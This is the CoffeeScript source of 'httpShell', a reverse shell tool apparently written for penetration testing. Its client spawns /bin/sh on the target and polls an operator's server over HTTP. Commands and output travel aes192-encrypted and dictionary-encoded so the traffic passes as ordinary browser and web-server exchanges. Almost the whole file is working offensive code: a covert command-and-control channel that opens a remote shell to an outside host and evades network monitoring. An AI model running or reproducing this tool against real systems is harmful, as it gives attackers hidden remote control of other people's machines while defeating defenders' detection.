http = require 'http'
{spawn} = require 'child_process'
{transcoder} = require './includes/transcoder'
fs = require 'fs'

#Help Message / Description...
helpme = \
"NAME:\n\t\
	httpShell - obfuscated reverse shell that looks like HTTP\n\n\

DESCRIPTION\n\t\
	This is an obfuscated client/server reverse shell. \n\n\t\

	If running as client, this application will act like an HTTP client (web browser),\n\t\
	making HTTP requests to the server. These requests will be encoded using the dictionary\n\t\
	files specified by the user. These requests will contain the results of the bash commands\n\t\
	send in the HTTP responses.\n\n\t\

	If running as the server, this application will act like an HTTP server, answering HTTP requests\n\t\
	sent by the client or by actual web browsers. The HTTP responses will bash commands encoded\n\t\
	into the dictionary file specified by the user.\n\n\t\

	--port\n\t\t\
		Port for the server to listen on, or port for the client to connect on\n\n\t\
	--host\n\t\t\
		address or domain name of the server (ony used by client)\n\n\t\
	--delay\n\t\t\
		amount of time to wait between http request (only used by client)\n\n\t\
	--password\n\t\t\
		data is aes192 encrypted on the wire. this is the shared secret\n\n\t\
	--dict\n\t\t\
		encoding dictionary file to be used (file with line deliniated words....).\n\t\t\
		This will be used for both client and server if the next two aren't specified\n\n\t\
	--clientdict\n\t\t\
		encoding dictionary file to be used by client(file with line deliniated words....).\n\t\t\
		you should probably build a dictionary that looks like something a browser would send\n\n\t\
	--serverdict\n\t\t\
		encoding dictionary file to be used by server(file with line deliniated words....).\n\t\t\
		you should probably build a dictionary that looks like something a web server would send\n\n\

AUTHOR\n\t\
	Written by Ben Toews (mastahyeti)\n\n\

COPYRIGHT\n\t\
	Copyright © 2011 Neohapsis Inc. License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.\n\t\
	This is free software: you are free to change and redistribute it.  There is NO WARRANTY, to the extent permitted by law."


#Default Options
client_dict = ['hello','world']
server_dict = ['hello','world']
port = 80
host = "127.0.0.1"
delay = 5000 #time between connections
password = 'supersecret'


#Fake HTTP server. Sends commands to client and prints command output to user
server = ->
	console.log "Running as server\n"
	to_client = ''
	#setup the stdin to receive input from user
	process.stdin.resume()
	process.stdin.setEncoding 'utf8'
	#when we get a command from the user we encode and send it to the client
	process.stdin.on 'data', (data) ->
		to_client += st.encode data
	#If they want a shell, we'll give them a prompt :D
	process.stdout.write "\nhttpshell> "
	#Create an HTTP server to listen for reponses from client
	http.createServer (request,response) ->
		request.setEncoding 'utf8'
		from_client = ''
		#when we get data we add it to a queue to send to the user
		#we do it this way rather than printing it directly to make sure that
		#chunked data shows up all at once
		request.on 'data', (data) ->
			from_client += ct.decode data
		#If the connection closes improperly, we just keep going
		request.on 'close', ->
			if from_client? and from_client != ''
				process.stdout.write from_client
				process.stdout.write 'httpShell# '
			response.end to_client
			to_client = ''
		#When the http request is finished we decode and print the data back to the user
		request.on 'end', ->
			if from_client? and from_client != ''
				process.stdout.write from_client
				process.stdout.write 'httpShell# '
			response.end to_client
			to_client = ''
	.listen port

#Read a file. Each line in the file will be an element in a dictionary.
readbyline = (path) ->
	data = fs.readFileSync path,'utf8'
	#figure out enline
	data = data.split('\r\n')
	data = data[0].split('\n') if data.length == 1
	output = []
	for i in [0...data.length]
		d = data[i]
		for j in [0...data.length]
			#make sure we don't have duplicate or overlapping elements. can't have 'goodbye' and 'bye'
			d = if data[j].indexOf(data[i]) is -1 or j is i then d else ""
		output = if d isnt "" then output.concat(d) else output
	output

#Make a request to the server. Run any commands received and return any results to server
client_request = (to_return = '')->
	options = {host:host,port: port,path: '/',method: 'POST'}
	req = http.request options, (res) ->
		res.setEncoding 'utf8'
		res.on 'data', (data) ->
			if data? and data != ''
				decoded = st.decode data
				sh.stdin.write decoded
	req.write ct.encode(to_return)
	req.end()

#Display Usage Info
if process.argv.indexOf('--help') > 0 or process.argv.indexOf('-h') > 0
	console.log helpme
	process.exit()

#Parse the port argument
if process.argv.indexOf('--port') > 0
	port = parseInt(process.argv[process.argv.indexOf('--port') + 1])

#Parse the host argument
if process.argv.indexOf('--host') > 0
	host = process.argv[process.argv.indexOf('--host') + 1]

#Parse the delay argument
if process.argv.indexOf('--delay') > 0
	delay = paseInt(process.argv[process.argv.indexOf('--delay') + 1])

#Parse the password argument
if process.argv.indexOf('--password') > 0
	password = process.argv[process.argv.indexOf('--password') + 1]

#Parse the dictionary file argument
if process.argv.indexOf('--dict') > 0
	dict_file = process.argv[process.argv.indexOf('--dict') + 1]
	dict = readbyline dict_file
	client_dict = dict
	server_dict = dict

#Parse the client dictionary file argument
if process.argv.indexOf('--clientdict') > 0
	client_dict_file = process.argv[process.argv.indexOf('--clientdict') + 1]
	client_dict = readbyline client_dict_file

#Parse the server dictionary file argument
if process.argv.indexOf('--serverdict') > 0
	server_dict_file = process.argv[process.argv.indexOf('--serverdict') + 1]
	server_dict = readbyline server_dict_file 

console.log "We will be using the following options:"
console.log "host             : #{host}"
console.log "port             : #{port}"
console.log "delay            : #{delay}"
console.log "password         : #{password}"
console.log "client dictionary: #{client_dict}"
console.log "server dictionary: #{server_dict}\n"

#Set up the transcoders to be used.
ct = new transcoder client_dict, password
st = new transcoder server_dict, password

#Run the Server
if process.argv.indexOf('--server') != -1
	server() 

#Run the Client
if process.argv.indexOf('--client') != -1
	console.log "Running as client\n"
	#Spawn a shell as a subprocess
	sh = spawn '/bin/sh'
	sh.stdout.setEncoding 'utf8'
	sh.stderr.setEncoding 'utf8'
	#When the shell gives us data we send it to the server
	sh.stdout.on 'data', (data) ->
		client_request data
	sh.stderr.on 'data', (data) ->
		client_request data
	#We periodically send a request to the server to see
	#if there are more commands to run.
	setInterval client_request,	delay
